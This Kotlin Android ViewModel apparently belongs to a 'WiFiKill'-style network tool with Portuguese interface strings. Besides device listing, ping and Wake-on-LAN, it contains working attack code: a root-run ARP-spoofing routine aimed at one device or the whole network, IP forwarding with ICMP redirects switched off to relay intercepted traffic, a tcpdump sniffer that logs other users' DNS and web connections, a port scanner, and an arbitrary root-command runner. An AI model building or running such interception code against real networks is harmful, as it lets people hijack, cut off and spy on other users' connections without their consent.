package com.example.ui

import android.app.Application
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.data.AppDatabase
import com.example.data.NetworkDevice
import com.example.data.NetworkEvent
import com.example.data.NetworkRepository
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.flatMapLatest
import android.content.Context
import android.net.wifi.WifiManager
import kotlinx.coroutines.sync.withPermit

@OptIn(kotlinx.coroutines.ExperimentalCoroutinesApi::class)
class NetworkViewModel(application: Application) : AndroidViewModel(application) {
    private val repository: NetworkRepository
    
    private val prefs = application.getSharedPreferences("wifi_manager_prefs", Context.MODE_PRIVATE)
    
    val allDevices: StateFlow<List<NetworkDevice>>
    val blockedCount: StateFlow<Int>
    val totalCount: StateFlow<Int>
    val allEvents: StateFlow<List<NetworkEvent>>
    
    private val _currentSSID = MutableStateFlow("SSID: MATRIX_5G_SECURE (Mock)")
    val currentSSID: StateFlow<String> = _currentSSID.asStateFlow()
    
    private val _currentNetworkId = MutableStateFlow("")
    val currentNetworkId: StateFlow<String> = _currentNetworkId.asStateFlow()

    // Redirect Rule State
    private val _redirectUrl = MutableStateFlow(prefs.getString("redirect_url", "https://scholar.google.com/") ?: "")
    val redirectUrl = _redirectUrl.asStateFlow()
    private val _targetMode = MutableStateFlow(prefs.getString("target_mode", "ALL") ?: "ALL")
    val targetMode = _targetMode.asStateFlow()
    private val _targetDevice = MutableStateFlow(prefs.getString("target_device", "") ?: "")
    val targetDevice = _targetDevice.asStateFlow()
    private val _isRedirectActive = MutableStateFlow(prefs.getBoolean("redirect_active", false))
    val isRedirectActive = _isRedirectActive.asStateFlow()
    private val _customGateway = MutableStateFlow(prefs.getString("custom_gateway", "") ?: "")
    val customGateway = _customGateway.asStateFlow()

    fun updateRedirectRule(url: String, mode: String, device: String, active: Boolean) {
        prefs.edit()
            .putString("redirect_url", url)
            .putString("target_mode", mode)
            .putString("target_device", device)
            .putBoolean("redirect_active", active)
            .apply()
        _redirectUrl.value = url
        _targetMode.value = mode
        _targetDevice.value = device
        _isRedirectActive.value = active
    }
    
    fun updateCustomGateway(gateway: String) {
        prefs.edit().putString("custom_gateway", gateway).apply()
        _customGateway.value = gateway
    }

    private val _isDeviceRooted = MutableStateFlow(false)
    val isDeviceRooted: StateFlow<Boolean> = _isDeviceRooted.asStateFlow()

    private val _ipForwardEnabled = MutableStateFlow(false)
    val ipForwardEnabled: StateFlow<Boolean> = _ipForwardEnabled.asStateFlow()

    private val _snifferLogs = MutableStateFlow<List<String>>(emptyList())
    val snifferLogs: StateFlow<List<String>> = _snifferLogs.asStateFlow()
    
    private val _isSniffing = MutableStateFlow(false)
    val isSniffing: StateFlow<Boolean> = _isSniffing.asStateFlow()
    
    private val _rootToolLogs = MutableStateFlow<List<String>>(emptyList())
    val rootToolLogs: StateFlow<List<String>> = _rootToolLogs.asStateFlow()

    fun appendRootLog(msg: String) {
        _rootToolLogs.value = (_rootToolLogs.value + msg).takeLast(50)
    }

    private val _isArpSpoofing = MutableStateFlow(false)

    val isArpSpoofing: StateFlow<Boolean> = _isArpSpoofing.asStateFlow()
    
    private var snifferJob: kotlinx.coroutines.Job? = null
    private var arpSpoofJob: kotlinx.coroutines.Job? = null

    init {
        val database = AppDatabase.getDatabase(application)
        repository = NetworkRepository(database.deviceDao())
        
        checkRootAccess()
        
        // Fetch SSID and Network ID before initializing device flows
        fetchRealSSID()
        
        viewModelScope.launch(Dispatchers.IO) {
            try {
                database.deviceDao().deleteOldMockDevices()
            } catch (e: Exception) { e.printStackTrace() }
        }
        
        allEvents = repository.allEvents.stateIn(
            viewModelScope,
            SharingStarted.WhileSubscribed(5000),
            emptyList()
        )
        
        allDevices = _currentNetworkId
            .flatMapLatest { netId -> database.deviceDao().getAllDevicesByNetwork(netId) }
            .stateIn(
                viewModelScope,
                SharingStarted.WhileSubscribed(5000),
                emptyList()
            )
        
        blockedCount = _currentNetworkId
            .flatMapLatest { netId -> repository.getBlockedDeviceCount(netId) }
            .stateIn(
                viewModelScope,
                SharingStarted.WhileSubscribed(5000),
                0
            )
        
        totalCount = _currentNetworkId
            .flatMapLatest { netId -> repository.getTotalDeviceCount(netId) }
            .stateIn(
                viewModelScope,
                SharingStarted.WhileSubscribed(5000),
                0
            )
        
        fetchRealSSID()
        
        // Sync with Backend
        viewModelScope.launch {
            delay(1000)
            syncWithBackend()
        }
    }
    
    fun fetchRealSSID() {
        try {
            val wifiManager = getApplication<Application>().getSystemService(Context.WIFI_SERVICE) as WifiManager
            val info = wifiManager.connectionInfo
            val ssid = info.ssid
            val bssid = info.bssid ?: ""
            if (ssid != null && ssid != "<unknown ssid>" && ssid != "\"\"" && ssid.isNotEmpty()) {
                val cleanSsid = ssid.removePrefix("\"").removeSuffix("\"")
                val newNetId = bssid.ifEmpty { cleanSsid }
                val oldNetId = _currentNetworkId.value
                
                _currentSSID.value = "SSID: $cleanSsid"
                _currentNetworkId.value = newNetId
                
                if (oldNetId == "UNKNOWN_NETWORK" || oldNetId == "ERROR_NETWORK") {
                    viewModelScope.launch(Dispatchers.IO) {
                        try {
                            val db = AppDatabase.getDatabase(getApplication())
                            db.deviceDao().updateNetworkId(oldNetId, newNetId)
                        } catch (e: Exception) {
                            e.printStackTrace()
                        }
                    }
                }
            } else {
                _currentSSID.value = "SSID: Unknown (O Android exige Localização/GPS ativa)"
                _currentNetworkId.value = "UNKNOWN_NETWORK"
            }
        } catch (e: Exception) {
            e.printStackTrace()
            _currentSSID.value = "SSID: Erro de Permissão"
            _currentNetworkId.value = "ERROR_NETWORK"
        }
    }
    
    fun getDevice(mac: String): kotlinx.coroutines.flow.Flow<NetworkDevice?> {
        return repository.getDevice(mac)
    }
    
    fun getEvents(mac: String): kotlinx.coroutines.flow.Flow<List<NetworkEvent>> {
        return repository.getEvents(mac)
    }
    
    fun toggleBlockStatus(mac: String, currentBlocked: Boolean) {
        viewModelScope.launch(Dispatchers.IO) {
            val newStatus = !currentBlocked
            // Simulate backend delay
            kotlinx.coroutines.delay(300)
            repository.setBlockStatus(mac, newStatus)
        }
    }

    fun clearAllLogs() {
        viewModelScope.launch(Dispatchers.IO) {
            repository.clearAllEvents()
        }
    }

    fun updateCustomName(mac: String, name: String) {
        viewModelScope.launch(Dispatchers.IO) {
            repository.updateCustomName(mac, name)
        }
    }

    private suspend fun syncWithBackend() {
        withContext(Dispatchers.IO) {
            // Em vez de usar API que não existe, fazemos uma varredura real na rede local
            runNetworkScan()
        }
    }
    
    

    
    private val _scanProgress = MutableStateFlow(0f)
    val scanProgress: StateFlow<Float> = _scanProgress.asStateFlow()

    private val _isScanningState = MutableStateFlow(false)
    val isScanningState: StateFlow<Boolean> = _isScanningState.asStateFlow()

    private val scanSemaphore = kotlinx.coroutines.sync.Semaphore(50) // Reduced concurrency bottleneck
    private val isScanning = java.util.concurrent.atomic.AtomicBoolean(false)

    fun runNetworkScan() {
        if (!isScanning.compareAndSet(false, true)) return
        _isScanningState.value = true
        _scanProgress.value = 0f
        viewModelScope.launch(Dispatchers.IO) {
            try {
                fetchRealSSID()
                val wifiManager = getApplication<Application>().getSystemService(Context.WIFI_SERVICE) as? WifiManager
                val dhcp = wifiManager?.dhcpInfo
                var ipAddress = dhcp?.ipAddress ?: 0
                var gateway = dhcp?.gateway ?: 0
                // Fallback for emulator without real wifi connection
                if (ipAddress == 0) {
                    ipAddress = 192 or (168 shl 8) or (1 shl 16) or (15 shl 24)
                    gateway = 192 or (168 shl 8) or (1 shl 16) or (1 shl 24)
                }

                // Adicionar o Gateway Local
                val gwIp = if (_customGateway.value.isNotEmpty()) {
                        _customGateway.value
                    } else {
                        String.format(
                            java.util.Locale.getDefault(), 
                            "%d.%d.%d.%d",
                            gateway and 0xff, 
                            gateway shr 8 and 0xff, 
                            gateway shr 16 and 0xff,
                            gateway shr 24 and 0xff
                        )
                    }
                    
                    // Se o usuário colocou o customGateway diferente da dhcp, o ipString baseia nele
                    val ipString = if (_customGateway.value.isNotEmpty()) {
                        val parts = _customGateway.value.split(".")
                        if (parts.size == 4) {
                            "${parts[0]}.${parts[1]}.${parts[2]}."
                        } else {
                            // Converter ipAddress
                            String.format(
                                java.util.Locale.getDefault(), 
                                "%d.%d.%d.",
                                ipAddress and 0xff, 
                                ipAddress shr 8 and 0xff, 
                                ipAddress shr 16 and 0xff
                            )
                        }
                    } else {
                        String.format(
                            java.util.Locale.getDefault(), 
                            "%d.%d.%d.",
                            ipAddress and 0xff, 
                            ipAddress shr 8 and 0xff, 
                            ipAddress shr 16 and 0xff
                        )
                    }
                    
                    val myIpFormatted = String.format(
                        java.util.Locale.getDefault(), 
                        "%d.%d.%d.%d",
                        ipAddress and 0xff, 
                        ipAddress shr 8 and 0xff, 
                        ipAddress shr 16 and 0xff,
                        ipAddress shr 24 and 0xff
                    )

                    val database = AppDatabase.getDatabase(getApplication())
                    val dao = database.deviceDao()
                    
                    val currentNetId = _currentNetworkId.value
                    val meMac = getHardwareMacAddress()
                    val existingMe = dao.getDeviceByMacSync(meMac)
                    if (existingMe == null) {
                        repository.saveDevice(NetworkDevice(meMac, "Meu Android", "phone", "Local", myIpFormatted, isTrusted = true, networkId = currentNetId))
                    } else if (existingMe.lastIp != myIpFormatted || existingMe.networkId != currentNetId) {
                        repository.saveDevice(existingMe.copy(lastIp = myIpFormatted, networkId = currentNetId))
                    }
                    
                    val gwMac = getMacFromArp(gwIp)
                    if (gateway != 0) {
                        val existingGw = dao.getDeviceByMacSync(gwMac)
                        if (existingGw == null) {
                            repository.saveDevice(NetworkDevice(gwMac, "Roteador WiFi", "router", "Network", gwIp, isTrusted = true, networkId = currentNetId))
                        } else if (existingGw.lastIp != gwIp || existingGw.networkId != currentNetId) {
                            repository.saveDevice(existingGw.copy(lastIp = gwIp, networkId = currentNetId))
                        }
                    }

                    // Real Discovery via Ping Sweep and ARP Table
                    val isRooted = _isDeviceRooted.value
                    val jobs = mutableListOf<kotlinx.coroutines.Job>()
                    // Do a quick ping sweep to populate local ARP table
                    val completedTasks = java.util.concurrent.atomic.AtomicInteger(0)
                    for (i in 1..254) { 
                        val job = launch(Dispatchers.IO) {
                            scanSemaphore.withPermit {
                                try {
                                    val targetIp = ipString + i
                                    if (targetIp != myIpFormatted && targetIp != gwIp) {
                                        val proc = Runtime.getRuntime().exec(arrayOf("ping", "-c", "1", "-W", "1", targetIp))
                                        proc.waitFor()
                                    }
                                } catch (e: Exception) {
                                    // Ignore
                                } finally {
                                    _scanProgress.value = completedTasks.incrementAndGet() / 254f
                                }
                            }
                        }
                        jobs.add(job)
                    }
                    jobs.forEach { it.join() }
                    
                    val arpTable = mutableMapOf<String, String>()
                    
                    // Try ip neigh
                    try {
                        val cmd = if (isRooted) arrayOf("su", "-c", "ip neigh") else arrayOf("ip", "neigh")
                        val process = Runtime.getRuntime().exec(cmd)
                        val reader = java.io.BufferedReader(java.io.InputStreamReader(process.inputStream))
                        var tmpLine: String?
                        val macRegex = "(?i)([0-9a-f]{2}[:-]){5}([0-9a-f]{2})".toRegex()
                        while (reader.readLine().also { tmpLine = it } != null) {
                            val line = tmpLine!!
                            val parts = line.split("\\s+".toRegex())
                            if (parts.size >= 5 && parts[0].matches(Regex("\\d+\\.\\d+\\.\\d+\\.\\d+"))) {
                                val m = macRegex.find(line)
                                if (m != null) {
                                    val mac = m.value.uppercase(java.util.Locale.getDefault())
                                    if(mac != "00:00:00:00:00:00") arpTable[parts[0]] = mac
                                }
                            }
                        }
                    } catch (e: Exception) { e.printStackTrace() }
                    
                    // Fallback to /proc/net/arp
                    if (arpTable.isEmpty()) {
                        try {
                            val cmd = if (isRooted) arrayOf("su", "-c", "cat /proc/net/arp") else arrayOf("cat", "/proc/net/arp")
                            val process = Runtime.getRuntime().exec(cmd)
                            val reader = java.io.BufferedReader(java.io.InputStreamReader(process.inputStream))
                            var tmpLine: String?
                            val macRegex = "(?i)([0-9a-f]{2}[:-]){5}([0-9a-f]{2})".toRegex()
                            while (reader.readLine().also { tmpLine = it } != null) {
                                val line = tmpLine!!
                                val parts = line.trim().split("\\s+".toRegex())
                                if (parts.size >= 4) {
                                    val match = macRegex.find(parts[3])
                                    if (match != null) {
                                        val mac = match.value.uppercase(java.util.Locale.getDefault())
                                        if(mac != "00:00:00:00:00:00") arpTable[parts[0]] = mac
                                    }
                                }
                            }
                        } catch(e: Exception) { e.printStackTrace() }
                    }
                    
                    // Save discovered devices
                    val liveNetId = _currentNetworkId.value
                    arpTable.forEach { (ip, mac) ->
                        if (ip == myIpFormatted || ip == gwIp) return@forEach
                        val existing = dao.getDeviceByMacSync(mac)
                        if (existing == null) {
                            val aliases = listOf("Dispositivo Desconhecido", "Smart TV", "Notebook", "Smartphone")
                            val newDevice = NetworkDevice(
                                macAddress = mac,
                                hostname = aliases.random(),
                                vendor = "Desconhecido",
                                lastIp = ip,
                                isTrusted = false,
                                isBlocked = false,
                                networkId = liveNetId
                            )
                            repository.saveDevice(newDevice)
                            repository.logDiscovery(mac)
                        } else {
                            val needsIpUpdate = existing.lastIp != ip
                            val needsNetworkIdUpdate = existing.networkId != liveNetId
                            if (needsIpUpdate || needsNetworkIdUpdate) {
                                repository.saveDevice(existing.copy(
                                    lastIp = if (needsIpUpdate) ip else existing.lastIp,
                                    networkId = if (needsNetworkIdUpdate) liveNetId else existing.networkId
                                ))
                            }
                        }
                    }
            } finally {
                isScanning.set(false)
                _isScanningState.value = false
            }
        }
    }
    fun runRealPing(ip: String, onResult: (String) -> Unit) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val process = Runtime.getRuntime().exec(arrayOf("/system/bin/ping", "-c", "4", targetIp(ip)))
                val reader = java.io.BufferedReader(java.io.InputStreamReader(process.inputStream))
                val output = StringBuilder()
                var tmpLine: String?
                while (reader.readLine().also { tmpLine = it } != null) {
                    val line = tmpLine!!
                    output.append(line).append("\n")
                }
                process.waitFor()
                withContext(Dispatchers.Main) {
                    val res = output.toString()
                    onResult(res.ifEmpty { "Tempo limite esgotado. Host inacessível." })
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) { onResult("Erro ao executar ping: ${e.message}") }
            }
        }
    }
    
    private fun targetIp(ip: String): String {
        return ip.replace(Regex("[^0-9.]"), "") // Basic sanitize
    }

    fun runRealPortScan(ip: String, onResult: (List<String>) -> Unit) {
        viewModelScope.launch(Dispatchers.IO) {
            val commonPorts = listOf(21 to "FTP", 22 to "SSH", 23 to "Telnet", 25 to "SMTP", 53 to "DNS", 80 to "HTTP", 110 to "POP3", 143 to "IMAP", 443 to "HTTPS", 445 to "SMB", 3306 to "MySQL", 3389 to "RDP", 8080 to "HTTP-Alt")
            val openPorts = mutableListOf<String>()
            val target = targetIp(ip)
            for (port in commonPorts) {
                try {
                    val socket = java.net.Socket()
                    socket.connect(java.net.InetSocketAddress(target, port.first), 300) // 300ms timeout
                    socket.close()
                    openPorts.add("${port.first} (${port.second})")
                } catch (e: Exception) {
                    // Closed or timeout
                }
            }
            withContext(Dispatchers.Main) {
                if (openPorts.isEmpty()) {
                    openPorts.add("Nenhuma das portas comuns (80, 443, 22, etc) está aberta.")
                }
                onResult(openPorts)
            }
        }
    }
    
    fun wakeOnLan(mac: String, onResult: (String) -> Unit) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val macBytes = getMacBytes(mac)
                val bytes = ByteArray(6 + 16 * macBytes.size)
                for (i in 0..5) bytes[i] = 0xff.toByte()
                for (i in 6 until bytes.size step macBytes.size) {
                    System.arraycopy(macBytes, 0, bytes, i, macBytes.size)
                }
                val address = java.net.InetAddress.getByName("255.255.255.255")
                val packet = java.net.DatagramPacket(bytes, bytes.size, address, 9)
                val socket = java.net.DatagramSocket()
                socket.broadcast = true
                socket.send(packet)
                socket.close()
                withContext(Dispatchers.Main) { onResult("Magic Packet enviado para $mac!") }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) { onResult("Erro Wake-On-LAN: formato MAC inválido ou falha de rede.") }
            }
        }
    }

    private fun getMacBytes(macStr: String): ByteArray {
        val bytes = ByteArray(6)
        val hex = macStr.split(":", "-")
        if (hex.size != 6) throw IllegalArgumentException("Invalid MAC address")
        try {
            for (i in 0..5) {
                bytes[i] = Integer.parseInt(hex[i], 16).toByte()
            }
        } catch (e: Exception) {
            throw IllegalArgumentException("Invalid MAC address")
        }
        return bytes
    }

    private fun checkRootAccess() {
        viewModelScope.launch(Dispatchers.IO) {
            var isRooted = false
            val paths = arrayOf(
                "/system/app/Superuser.apk",
                "/sbin/su",
                "/system/bin/su",
                "/system/xbin/su",
                "/data/local/xbin/su",
                "/data/local/bin/su",
                "/system/sd/xbin/su",
                "/system/bin/failsafe/su",
                "/data/local/su",
                "/su/bin/su"
            )
            for (path in paths) {
                if (java.io.File(path).exists()) {
                    isRooted = true
                    break
                }
            }
            if (!isRooted) {
                try {
                    val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "echo test"))
                    process.waitFor()
                    if (process.exitValue() == 0) isRooted = true
                } catch (e: Exception) {
                    // Not rooted
                }
            }
            _isDeviceRooted.value = isRooted
            if (isRooted) checkIpForward()
        }
    }

    private fun executeSuCmd(cmd: String): String {
        return try {
            val process = Runtime.getRuntime().exec("su")
            val os = java.io.DataOutputStream(process.outputStream)
            // Redirect stderr to stdout so we only read one stream
            os.writeBytes(cmd + " 2>&1\n")
            os.writeBytes("exit\n")
            os.flush()
            
            val reader = java.io.BufferedReader(java.io.InputStreamReader(process.inputStream))
            val output = java.lang.StringBuilder()
            var tmpLine: String?
            while (reader.readLine().also { tmpLine = it } != null) {
                val line = tmpLine!!
                output.append(line).append("\n")
            }
            os.close()
            reader.close()
            process.waitFor()
            process.destroy()
            output.toString().trim()
        } catch (e: Exception) {
            ""
        }
    }

    fun checkIpForward() {
        viewModelScope.launch(Dispatchers.IO) {
            val output = executeSuCmd("cat /proc/sys/net/ipv4/ip_forward")
            _ipForwardEnabled.value = (output == "1")
        }
    }

    fun setIpForward(enable: Boolean) {
        viewModelScope.launch(Dispatchers.IO) {
            val value = if (enable) "1" else "0"
            executeSuCmd("echo $value > /proc/sys/net/ipv4/ip_forward")
            if (enable) {
                executeSuCmd("echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects")
                executeSuCmd("echo 0 > /proc/sys/net/ipv4/conf/wlan0/send_redirects")
            }
            checkIpForward()
        }
    }

    fun startSniffer() {
        if (_isSniffing.value) return
        _isSniffing.value = true
        _snifferLogs.value = emptyList()
        snifferJob = viewModelScope.launch(Dispatchers.IO) {
            try {
                executeSuCmd("killall tcpdump")
                
                val process = Runtime.getRuntime().exec("su")
                val os = java.io.DataOutputStream(process.outputStream)
                os.writeBytes("tcpdump -l -nn -i any udp port 53 or tcp port 80 or tcp port 443 2>/dev/null\n")
                os.flush()
                
                val reader = java.io.BufferedReader(java.io.InputStreamReader(process.inputStream))
                var tmpLine: String? = null
                while (isActive && reader.readLine().also { tmpLine = it } != null) {
                    val line = tmpLine!!
                    val entry = if (line.contains("A?")) {
                        val pieces = line.split(" ")
                        val domainIdx = pieces.indexOfFirst { it == "A?" }
                        if (domainIdx != -1 && domainIdx + 1 < pieces.size) {
                            val ip = pieces.firstOrNull { it.matches(Regex("\\d+\\.\\d+\\.\\d+\\.\\d+\\.\\d+")) }?.substringBeforeLast(".") ?: "Desconhecido"
                            "🌐 DNS ($ip): ${pieces[domainIdx + 1].trim('.')}"
                        } else null
                    } else if (line.contains("HTTP")) {
                        val ip = line.split(" ").firstOrNull { it.matches(Regex("\\d+\\.\\d+\\.\\d+\\.\\d+\\.\\d+")) }?.substringBeforeLast(".") ?: "Desconhecido"
                        "📄 HTTP Tráfego: $ip"
                    } else if (line.contains("443")) {
                        val ip = line.split(" ").firstOrNull { it.matches(Regex("\\d+\\.\\d+\\.\\d+\\.\\d+\\.\\d+")) }?.substringBeforeLast(".") ?: "Desconhecido"
                        "🔒 HTTPS Tráfego: $ip"
                    } else null
                    
                    if (entry != null) {
                        _snifferLogs.update { list -> 
                            val newList = list.toMutableList()
                            newList.add(0, "${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())} - $entry")
                            if (newList.size > 100) newList.take(100) else newList
                        }
                    }
                }
                os.close()
                reader.close()
                process.destroy()
            } catch (e: kotlinx.coroutines.CancellationException) {
                // Cancelled normally
            } catch (e: Exception) {
                _isSniffing.value = false
            }
        }
    }

    fun stopSniffer() {
        snifferJob?.cancel()
        viewModelScope.launch(Dispatchers.IO) {
            executeSuCmd("killall tcpdump")
        }
        _isSniffing.value = false
    }

    fun clearSnifferLogs() {
        _snifferLogs.value = emptyList()
    }

    private fun getHardwareMacAddress(): String {
        var resultMac = "02:00:00:00:00:00"
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            for (intf in java.util.Collections.list(interfaces)) {
                if (intf.name.equals("wlan0", ignoreCase = true)) {
                    val mac = intf.hardwareAddress
                    if (mac != null) {
                        val buf = StringBuilder()
                        for (aMac in mac) {
                            buf.append(String.format("%02X:", aMac))
                        }
                        if (buf.length > 0) {
                            buf.deleteCharAt(buf.length - 1)
                        }
                        val finalMac = buf.toString().uppercase()
                        if (finalMac != "02:00:00:00:00:00") {
                            return finalMac
                        }
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        
        // Fallback to su if available
        try {
            val suMac = executeSuCmd("ip link | grep ether | awk '{print \$2}'").trim()
            val validLine = suMac.lines().firstOrNull { it.isNotBlank() && !it.contains("02:00:00:00:00:00") && it.length >= 15 }
            if (validLine != null) return validLine.substring(0, 17).uppercase()
            
            val suMac2 = executeSuCmd("cat /sys/class/net/*/address").trim()
            val validLine2 = suMac2.lines().firstOrNull { it.isNotBlank() && !it.contains("02:00:00:00:00:00") && it.length >= 15 }
            if (validLine2 != null) return validLine2.substring(0, 17).uppercase()
        } catch (e: Exception) {}
        
        return resultMac
    }

    private fun getMacFromArp(ip: String): String {
        try {
            // First ping with SU to force ARP table update
            executeSuCmd("ping -c 1 -W 1 $ip")
            
            // Try modern ip neigh
            var mac = executeSuCmd("ip neigh show $ip | head -n 1").trim()
            if (mac.contains("lladdr")) {
                 mac = executeSuCmd("ip neigh show $ip | grep lladdr | awk '{print \$5}' | head -n 1").trim()
            } else {
                 mac = ""
            }
            
            if (mac.isEmpty() || mac.length < 15 || mac.contains("FAILED") || mac.contains("INCOMPLETE")) {
                // Try reading directly from hardware arp table using ip command
                var neighAll = executeSuCmd("ip neigh | grep '$ip ' | head -n 1").trim()
                if(neighAll.contains("lladdr")) {
                    mac = executeSuCmd("ip neigh | grep '$ip ' | grep lladdr | awk '{print \$5}' | head -n 1").trim()
                }
            }
            
            if (mac.isEmpty() || mac.length < 15 || mac.contains("FAILED") || mac.contains("INCOMPLETE")) {
                // Fallback to procfs
                mac = executeSuCmd("cat /proc/net/arp | grep '$ip ' | awk '{print \$4}' | head -n 1").trim()
            }
            
            if (mac.isEmpty() || mac.length < 15) {
                return "00:00:00:00:00:00"
            }
            return mac.uppercase()
        } catch (e: Exception) {
            return "00:00:00:00:00:00"
        }
    }

    fun getGatewayIp(): String {
        if (_customGateway.value.isNotEmpty()) return _customGateway.value
        val wifiManager = getApplication<Application>().getSystemService(Context.WIFI_SERVICE) as? WifiManager
        val gateway = wifiManager?.dhcpInfo?.gateway ?: 0
        return String.format(
            java.util.Locale.getDefault(), 
            "%d.%d.%d.%d",
            gateway and 0xff, 
            gateway shr 8 and 0xff, 
            gateway shr 16 and 0xff,
            gateway shr 24 and 0xff
        )
    }

    fun startArpSpoof(targetIp: String, targetMac: String) {
        if (_isArpSpoofing.value) return
        _isArpSpoofing.value = true
        
        // Ensure IP forwarding is enabled
        setIpForward(true)
        
        arpSpoofJob = viewModelScope.launch(Dispatchers.IO) {
            try {
                // Get my MAC address
                val myMac = getHardwareMacAddress()
                if (myMac == "02:00:00:00:00:00" || myMac.isEmpty()) throw Exception("Não foi possível obter o MAC do celular: $myMac")
                
                // Get router IP and MAC
                val routerIp = getGatewayIp()
                val routerMac = getMacFromArp(routerIp)
                
                if (routerMac == "00:00:00:00:00:00" || routerMac.isEmpty()) throw Exception("Router MAC not found")

                val c = getApplication<Application>()
                val libDir = c.applicationInfo.nativeLibraryDir
                val arpspoofPath = "$libDir/libarpspoof.so"
                
                android.util.Log.d("WiFiKill", "Iniciando ARP Spoof via C binary...")
                appendRootLog("Iniciando ataque em segundo plano...")
                executeSuCmd("rm /data/local/tmp/arpspoof.log")
                val process = Runtime.getRuntime().exec("su")
                val os = java.io.DataOutputStream(process.outputStream)
                
                if (targetMac.isEmpty() || targetMac == "FF:FF:FF:FF:FF:FF") {
                    val cmd3 = "$arpspoofPath wlan0 $targetIp $routerIp $routerMac $myMac >> /data/local/tmp/arpspoof.log 2>&1"
                    os.writeBytes("nohup $cmd3 &\n")
                    appendRootLog("Alvo: Rede Inteira")
                } else {
                    val cmd1 = "$arpspoofPath wlan0 $routerIp $targetIp $targetMac $myMac >> /data/local/tmp/arpspoof.log 2>&1"
                    val cmd2 = "$arpspoofPath wlan0 $targetIp $routerIp $routerMac $myMac >> /data/local/tmp/arpspoof.log 2>&1"
                    os.writeBytes("nohup $cmd1 &\n")
                    os.writeBytes("nohup $cmd2 &\n")
                    appendRootLog("Alvo Especifico: $targetIp")
                }
                os.writeBytes("exit\n")
                os.flush()
                os.close()
                process.waitFor()
                process.destroy()
                
                // Let's capture the log after 2 seconds to see if it crashed
                delay(2000)
                val logOutput = executeSuCmd("cat /data/local/tmp/arpspoof.log")
                if (logOutput.isNotEmpty()) {
                    appendRootLog("Arpspoof log: $logOutput")
                }
                
                appendRootLog("Ataque ativo!")
                
                while(isActive) {
                    delay(1000)
                }
                
            } catch (e: kotlinx.coroutines.CancellationException) {
                // Cancelled normally
                appendRootLog("Ataque interrompido.")
            } catch (e: Exception) {
                appendRootLog("Erro no ARP Spoof: ${e.message}")
                android.util.Log.e("WiFiKill", "Erro no ARP Spoofing", e)
                withContext(Dispatchers.Main) { stopArpSpoof() }
            }
        }
    }

    fun stopArpSpoof() {
        arpSpoofJob?.cancel()
        viewModelScope.launch(Dispatchers.IO) {
            executeSuCmd("killall arpspoof")
        }
        _isArpSpoofing.value = false
    }

    fun executeRootCommand(cmd: String, onResult: (String) -> Unit) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                appendRootLog("Executando: $cmd")
                android.util.Log.d("WiFiKill", "Executando comando: $cmd")
                val process = Runtime.getRuntime().exec("su")
                val os = java.io.DataOutputStream(process.outputStream)
                // Redirect stderr to stdout so we safely read everything without blocking
                os.writeBytes(cmd + " 2>&1\n")
                os.writeBytes("exit\n")
                os.flush()
                
                val reader = java.io.BufferedReader(java.io.InputStreamReader(process.inputStream))
                val output = java.lang.StringBuilder()
                var tmpLine: String?
                
                while (reader.readLine().also { tmpLine = it } != null) {
                    val line = tmpLine!!
                    output.append(line).append("\n")
                    appendRootLog("> $line")
                }
                process.waitFor()
                val exitCode = process.exitValue()
                val result = output.toString().trim()
                val debugOutput = "[DEBUG] Exit Code: $exitCode\n[DEBUG] Comando: $cmd\n[OUTPUT]\n" + (if (result.isEmpty()) "(Sem retorno)" else result)
                android.util.Log.d("WiFiKill", debugOutput)
                withContext(Dispatchers.Main) {
                    onResult(debugOutput)
                }
            } catch (e: Exception) {
                appendRootLog("Falha Root: ${e.message}")
                android.util.Log.e("WiFiKill", "Erro ao executar", e)
                withContext(Dispatchers.Main) { onResult("Falha ao invocar 'su': ${e.message}") }
            }
        }
    }
}
